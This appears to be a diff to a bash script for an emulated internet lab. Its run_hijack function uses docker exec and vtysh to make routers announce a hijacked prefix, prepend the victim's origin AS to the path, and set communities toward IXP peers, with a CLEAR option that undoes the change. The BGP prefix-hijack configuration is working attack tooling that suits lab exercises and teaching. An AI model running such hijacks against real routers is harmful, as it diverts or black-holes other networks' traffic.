@@ -49,6 +49,8 @@ run_hijack () {
     group_numbers=${#groups[@]}
     n_extern_links=${#extern_links[@]}
 
+    route_map_permit=$((SEQ+100))
+
     for ((k=0;k<group_numbers;k++)); do
         group_k=(${groups[$k]})
         group_number="${group_k[0]}"
@@ -85,6 +87,7 @@ run_hijack () {
                             throughput="${row_j[6]}"
                             delay="${row_j[7]}"
 
+
                             bgp_peer_num=''
                             if [ "${grp_1}" == "${group_number}" ] && [ "${router_grp_1}" == "$rname" ] ;then
                                 bgp_peer_num="${grp_2}"
@@ -93,22 +96,51 @@ run_hijack () {
                                 bgp_peer_num="${grp_1}"
                             fi
 
-                            # echo $bgp_peer_num
                             if [ ! -z "$bgp_peer_num" ]; then 
-                                # In case we need to undo the route-map used for the hijack.
+                                str_tmp=''
+
+                                # Check if the router is connected to an IXP or not
+                                # and computes the route map name accordingly as well as the cummunity list
+                                for ((p=0;p<group_numbers;p++)); do
+                                    group_p=(${groups[$p]})
+                                    group_number_tmp="${group_p[0]}"
+                                    group_as_tmp="${group_p[1]}"
+                                    if [ "${bgp_peer_num}" = "${group_number_tmp}" ];then
+                                        if [ "${group_as_tmp}" = "IXP" ];then
+                                            route_map_name="IXP_OUT_"$bgp_peer_num
+                                            ixp_peers="${row_j[8]}"
+                                            for peer in $(echo $ixp_peers | sed "s/,/ /g"); do
+                                                str_tmp=${str_tmp}${grp_2}:${peer}" "
+                                            done
+                                        else
+                                            route_map_name="LOCAL_PREF_OUT_"$bgp_peer_num
+                                        fi
+                                    fi
+                                done
+
+                                # In case we execute the hijack, for the route-map.
                                 if [ -z "$CLEAR" ]; then
                                     docker exec -it ${group_number}_${rname}router vtysh \
                                         -c "conf t" \
-                                        -c "ip prefix-list HIJACKED_PREFIX seq 10 permit $HIJACKED_PREFIX" \
-                                        -c "route-map LOCAL_PREF_OUT_$bgp_peer_num permit 3" \
-                                        -c "match ip address prefix-list HIJACKED_PREFIX" \
-                                        -c "set as-path prepend $ORIGIN_AS" 
-                                # In case we execute the hijack, for the route-map.
+                                        -c "ip prefix-list HIJACKED_PREFIX_$ORIGIN_AS seq $SEQ permit $HIJACKED_PREFIX" \
+                                        -c "route-map $route_map_name permit $route_map_permit" \
+                                        -c "match ip address prefix-list HIJACKED_PREFIX_$ORIGIN_AS" \
+                                        -c "set as-path prepend $ORIGIN_AS"
+                                    
+                                    # Set communities in case the peer is an IXP
+                                    if [ ! -z "$str_tmp" ]; then
+                                        docker exec -it ${group_number}_${rname}router vtysh \
+                                            -c "conf t" \
+                                            -c "route-map $route_map_name permit $route_map_permit" \
+                                            -c "set community $str_tmp"
+                                    fi
+                                # In case we need to undo the route-map used for the hijack.
                                 else
+
                                     docker exec -it ${group_number}_${rname}router vtysh \
                                         -c "conf t" \
-                                        -c "$CLEAR ip prefix-list HIJACKED_PREFIX seq 10 permit $HIJACKED_PREFIX" \
-                                        -c "$CLEAR route-map LOCAL_PREF_OUT_$bgp_peer_num permit 3"
+                                        -c "$CLEAR ip prefix-list HIJACKED_PREFIX_$ORIGIN_AS seq $SEQ permit $HIJACKED_PREFIX" \
+                                        -c "$CLEAR route-map $route_map_name permit $route_map_permit"
                                 fi
                                 # Execute or undo the hijack.
                                 docker exec -it ${group_number}_${rname}router vtysh -c "conf t" -c "router bgp ${group_number}" -c "address-family ipv4 unicast" -c "$CLEAR network $HIJACKED_PREFIX"
